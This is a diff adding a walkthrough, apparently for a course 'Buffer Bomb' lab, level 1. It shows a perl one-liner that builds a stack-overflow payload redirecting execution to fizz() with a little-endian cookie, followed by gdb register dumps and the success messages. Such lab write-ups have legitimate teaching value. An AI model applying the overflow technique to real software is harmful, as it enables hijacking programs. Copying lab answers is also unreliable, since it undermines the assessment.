@@ -153,3 +153,116 @@ Now convert to little endian format
 
  Original hex id: 0x 2d 8c c7 0c
 little endian id: 0x 0c c7 8c 2d
+
+Now quit out of gdb with ```q``` command
+
+And create new input file with little endian id in replace of "CC"x4:
+```
+unix> perl -e 'print "61 "x44, "5f 90 04 08 ", "BB "x4, "0c c7 8c 2d " '> hexlevel1_2
+
+unix> ./hex2raw < hexlevel1_2 > raw
+```
+Now use new input file while in gdb by typing:
+```
+unix> gdb bufbomb
+(gdb) break fizz
+(gdb) run -u quinnliu < raw
+```
+
+Now the value held at 0x5568335C is your hex id in little endian:
+```(gdb) x/ 0x5568335C```
+
+Gives you:
+```
+(gdb) x/ 0x5568335C
+0x5568335c <_reserved+1037148>: 764200716
+```
+
+Now type:
+```
+(gdb) si
+(gdb) i r
+```
+Gives you:
+```
+(gdb) i r
+eax            0x2d8cc70c       764200716
+ecx            0xa      10
+edx            0xd0e334 13689652
+ebx            0x0      0
+esp            0x5568333c       0x5568333c
+ebp            0x55683354       0x55683354
+esi            0x55686018       1432903704
+edi            0xc60    3168
+eip            0x8049068        0x8049068 <fizz+9>
+eflags         0x216    [ PF AF IF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99
+```
+
+Now we are at fizz+9 before the cmp instruction has executed.
+
+Now again type:
+```
+(gdb) si
+(gdb) i r
+```
+Gives you:
+```
+(gdb) i r
+eax            0x2d8cc70c       764200716
+ecx            0xa      10
+edx            0x3c8334 3965748
+ebx            0x0      0
+esp            0x5568333c       0x5568333c
+ebp            0x55683354       0x55683354
+esi            0x55686018       1432903704
+edi            0xc60    3168
+eip            0x804906e        0x804906e <fizz+15>
+eflags         0x246    [ PF ZF IF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99
+```
+Now type:
+```continue```
+
+and you should get the completion message:
+```
+(gdb) continue
+Continuing.
+Type string:Fizz!: You called fizz(0x2d8cc70c)
+VALID
+NICE JOB!
+
+Program exited normally.
+```
+This is because at <fizz+15> after the cmp instruction has executed, the jne will not jump and the %eip (instruction pointer) points to the instruction immediately after the jne instruction.
+
+Now actually give your "raw" file as input to the Buffer Bomb:
+```./bufbomb -u quinnliu < raw```
+
+And you should get the following output:
+```
+Userid: quinnliu
+Cookie: 0x2d8cc70c
+Type string:Fizz!: You called fizz(0x2d8cc70c)
+VALID
+NICE JOB!
+```
+
+
+
+
+
+
+
+
+
